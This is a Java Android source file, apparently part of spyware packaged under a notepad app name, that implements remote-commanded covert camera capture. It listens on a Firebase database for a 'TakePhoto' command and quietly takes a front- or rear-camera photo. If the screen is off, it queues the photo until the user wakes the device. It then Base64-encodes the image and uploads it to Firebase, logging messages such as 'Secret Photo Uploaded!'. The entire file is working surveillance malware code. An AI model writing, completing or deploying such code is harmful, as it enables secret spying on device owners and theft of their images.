package com.megh.notepad; // আপনার প্যাকেজের সঠিক নাম চেক করে নিন

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.PowerManager;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CameraHelper {

    private static final String TAG = "CameraHelper";
    private static final String PREF_NAME = "CameraPrefs";
    private static final String KEY_PENDING_PHOTO = "isPendingPhoto";

    private static DatabaseReference commandRef;
    private static DatabaseReference typeRef;
    private static ValueEventListener cameraListener;
    
    private static CameraDevice cameraDevice;
    private static CameraCaptureSession captureSession;
    private static ImageReader previewReader; 
    private static ImageReader captureReader; 
    
    private static HandlerThread backgroundThread;
    private static Handler backgroundHandler;
    
    // 🛡️ নতুন: স্ক্রিন অন ইভেন্ট ধরার জন্য রিসিভার
    private static ScreenOnReceiver screenOnReceiver;

    private static void updateStatus(String status) {
        try {
            // BackgroundService.USER_ID আপনার মেইন সার্ভিসে ডিফাইন করা থাকতে হবে
            FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(BackgroundService.USER_ID).child("CameraStatus").setValue(status);
            Log.d(TAG, status);
        } catch (Exception e) {}
    }

    // ==========================================
    // 🌟 ১. ফায়ারবেস কমান্ড লিসেন করা 🌟
    // ==========================================
    public static void startListening(final Context context) {
        final Context appContext = context.getApplicationContext();
        commandRef = FirebaseDatabase.getInstance()
                .getReference("DeviceData").child(BackgroundService.USER_ID).child("Commands").child("TakePhoto");
        typeRef = FirebaseDatabase.getInstance()
                .getReference("DeviceData").child(BackgroundService.USER_ID).child("Commands").child("CameraType");

        if (cameraListener == null) {
            cameraListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    try {
                        if (snapshot.exists() && snapshot.getValue() != null) {
                            String commandStr = String.valueOf(snapshot.getValue());
                            if ("true".equalsIgnoreCase(commandStr)) {
                                commandRef.setValue("false"); // কমান্ড রিসেট
                                
                                // স্ক্রিন অফ আছে কিনা তা চেক করা
                                PowerManager pm = (PowerManager) appContext.getSystemService(Context.POWER_SERVICE);
                                boolean isScreenOn = pm.isInteractive();
                                
                                if (!isScreenOn) {
                                    // 🛡️ ম্যাজিক লজিক: স্ক্রিন অফ! ছবি তুলবে না, শুধু পেন্ডিং হিসেবে সেভ করবে।
                                    updateStatus("Screen is OFF. Photo command queued. Waiting for Screen ON...");
                                    setPendingPhoto(appContext, true); 
                                    registerScreenOnReceiver(appContext); // স্ক্রিন অন হওয়ার জন্য অপেক্ষা
                                    return; 
                                }

                                // স্ক্রিন অন থাকলে সাথে সাথে ছবি তুলবে
                                unregisterScreenOnReceiver(appContext); // কোনো পেন্ডিং রিসিভার থাকলে ডিলিট
                                setPendingPhoto(appContext, false);
                                updateStatus("Command Received. Screen is ON. Initiating Camera...");
                                triggerCaptureWithCameraType(appContext);
                            }
                        }
                    } catch (Exception e) {
                        updateStatus("Error: " + e.getMessage());
                    }
                }
                @Override
                public void onCancelled(@NonNull DatabaseError error) {}
            };
            commandRef.addValueEventListener(cameraListener);
        }
    }

    public static void stopListening(Context context) {
        if (commandRef != null && cameraListener != null) {
            commandRef.removeEventListener(cameraListener);
            cameraListener = null;
        }
        unregisterScreenOnReceiver(context);
        closeCamera();
    }

    // ==========================================
    // 🌟 ২. সাইলেন্ট কিউ - BroadcastReceiver লজিক 🌟
    // ==========================================
    private static class ScreenOnReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_SCREEN_ON.equals(intent.getAction())) {
                // 🛡️ ম্যাজিক লজিক: ইউজার স্ক্রিন অন করেছে! চোখের পলকে ছবি তোলো!
                if (isPendingPhoto(context)) {
                    updateStatus("Screen turned ON! Capturingqueued secret photo...");
                    triggerCaptureWithCameraType(context);
                    setPendingPhoto(context, false); // পেন্ডিং ফ্ল্যাগ ক্লিয়ার
                }
                unregisterScreenOnReceiver(context); // কাজ শেষ, রিসিভার বন্ধ করো
            }
        }
    }

    // হেল্পার: ক্যামেরা টাইপ নিয়ে ছবি তোলা শুরু করা
    private static void triggerCaptureWithCameraType(final Context context) {
        typeRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot typeSnap) {
                final String camType = typeSnap.exists() ? String.valueOf(typeSnap.getValue()) : "Front";
                takeHiddenPhoto(context, camType);
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    // ==========================================
    // 🌟 ৩. কোর ক্যামেরা আর্কিটেকচার (আপনার কোড) 🌟
    // ==========================================
    private static void takeHiddenPhoto(final Context context, final String cameraType) {
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                updateStatus("Error: Camera Permission Missing!");
                return;
            }

            if (backgroundThread == null) {
                backgroundThread = new HandlerThread("CameraThread");
                backgroundThread.start();
                backgroundHandler = new Handler(backgroundThread.getLooper());
            }

            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            String selectedId = getCameraId(manager, cameraType);

            // ১. ভুয়া লেন্স (Preview Reader) - ২ সেকেন্ড ওয়ার্মআপ করার জন্য
            previewReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2);
            previewReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    try {
                        Image image = reader.acquireLatestImage();
                        if (image != null) { image.close(); }
                    } catch (Exception e) {}
                }
            }, backgroundHandler);

            // ২. আসল লেন্স (Capture Reader) - HD ছবির জন্য
            captureReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
            captureReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            updateStatus("Photo Captured! Processing...");
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.capacity()];
                            buffer.get(bytes);
                            
                            // Base64 এ রূপান্তর (কন্ট্রোল অ্যাপে দেখানোর জন্য)
                            String base64Image = Base64.encodeToString(bytes, Base64.DEFAULT);
                            uploadToFirebase(base64Image, cameraType);
                        }
                    } catch (Exception e) {
                        updateStatus("Capture Error: " + e.getMessage());
                    } finally {
                        if (image != null) image.close();
                        closeCamera(); 
                    }
                }
            }, backgroundHandler);

            manager.openCamera(selectedId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    startPreviewAndCapture();
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { closeCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int e) { 
                    updateStatus("Camera Open Fail (Code: " + e + ")"); 
                    closeCamera(); 
                }
            }, backgroundHandler);

        } catch (Exception e) { 
            updateStatus("Exception: " + e.getMessage()); 
            closeCamera();
        }
    }

    private static void startPreviewAndCapture() {
        try {
            cameraDevice.createCaptureSession(Arrays.asList(previewReader.getSurface(), captureReader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    if (cameraDevice == null) return;
                    captureSession = session;
                    try {
                        CaptureRequest.Builder previewBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        previewBuilder.addTarget(previewReader.getSurface());
                        previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON); 
                        previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE); 
                        
                        captureSession.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler);
                        updateStatus("Adjusting Light (2s)...");

                        // লেন্স ২ সেকেন্ডে লাইট অ্যাডজাস্ট করবে
                        backgroundHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    if (cameraDevice == null) return;
                                    updateStatus("Capturing final HD image...");
                                    
                                    CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    captureBuilder.addTarget(captureReader.getSurface());
                                    captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                                    
                                    // ছবি সোজা করার জন্য ওরিয়েন্টেশন (প্রয়োজনে পাল্টাতে পারেন)
                                    captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, 90);

                                    captureSession.stopRepeating(); 
                                    captureSession.capture(captureBuilder.build(), null, backgroundHandler);
                                } catch (Exception e) {
                                    updateStatus("Final Capture Error: " + e.getMessage());
                                }
                            }
                        }, 2000); 

                    } catch (CameraAccessException e) { 
                        closeCamera(); 
                    }
                }
                @Override public void onConfigureFailed(@NonNull CameraCaptureSession s) { 
                    updateStatus("Configure Failed");
                    closeCamera(); 
                }
            }, backgroundHandler);
        } catch (Exception e) { 
            closeCamera(); 
        }
    }

    // ==========================================
    // 🌟 ৪. হেল্পার ও মেমোরি ম্যানেজমেন্ট 🌟
    // ==========================================
    private static String getCameraId(CameraManager manager, String type) throws CameraAccessException {
        int target = "Front".equalsIgnoreCase(type) ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
        for (String id : manager.getCameraIdList()) {
            if (manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == target) return id;
        }
        return manager.getCameraIdList()[0];
    }

    private static void closeCamera() {
        try {
            if (captureSession != null) { captureSession.close(); captureSession = null; }
            if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; }
            if (previewReader != null) { previewReader.close(); previewReader = null; }
            if (captureReader != null) { captureReader.close(); captureReader = null; }
            
            if (backgroundThread != null) {
                backgroundThread.quitSafely();
                try {
                    backgroundThread.join();
                    backgroundThread = null;
                    backgroundHandler = null;
                } catch (InterruptedException ignore) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera");
        }
    }

    private static void uploadToFirebase(String base64, String type) {
        try {
            DatabaseReference db = FirebaseDatabase.getInstance().getReference("DeviceData").child(BackgroundService.USER_ID).child("Photos");
            String time = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss", Locale.getDefault()).format(new Date());
            
            Map<String, Object> data = new HashMap<>();
            data.put("ImageBase64", base64);
            data.put("Camera_Type", type);
            data.put("Time", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date()));
            
            db.child("IMG_" + time).setValue(data);
            updateStatus("Success: Secret Photo Uploaded!");
        } catch (Exception e) {
            updateStatus("Upload Error: " + e.getMessage());
        }
    }

    // ==========================================
    // 🌟 ৫. পেন্ডিং স্টেট ও রিসিভার কন্ট্রোল 🌟
    // ==========================================
    private static void setPendingPhoto(Context context, boolean isPending) {
        SharedPreferences.Editor editor = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE).edit();
        editor.putBoolean(KEY_PENDING_PHOTO, isPending);
        editor.apply();
    }

    private static boolean isPendingPhoto(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(KEY_PENDING_PHOTO, false);
    }

    private static void registerScreenOnReceiver(Context context) {
        if (screenOnReceiver == null) {
            screenOnReceiver = new ScreenOnReceiver();
            IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
            context.registerReceiver(screenOnReceiver, filter);
            Log.d(TAG, "ScreenOnReceiver Registered.");
        }
    }

    private static void unregisterScreenOnReceiver(Context context) {
        if (screenOnReceiver != null) {
            try {
                context.unregisterReceiver(screenOnReceiver);
            } catch (Exception ignore) {}
            screenOnReceiver = null;
            Log.d(TAG, "ScreenOnReceiver Unregistered.");
        }
    }
}
